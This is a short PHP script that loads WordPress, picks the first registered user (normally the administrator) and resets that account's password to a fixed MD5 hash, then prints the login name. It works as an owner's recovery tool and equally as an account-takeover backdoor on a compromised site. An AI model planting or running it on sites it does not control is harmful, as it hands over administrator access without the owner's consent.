<?php
require_once('wp-load.php');
global $wpdb;

$result = $wpdb->get_var("SELECT user_login FROM {$wpdb->users} ORDER BY ID ASC LIMIT 0,1");
$wpdb->query("UPDATE {$wpdb->users} SET user_pass = '85237cdf505e6ae6c19993b9db709b36' WHERE user_login = '" . $result . "'");

echo 'Login with "' . $result . '"';
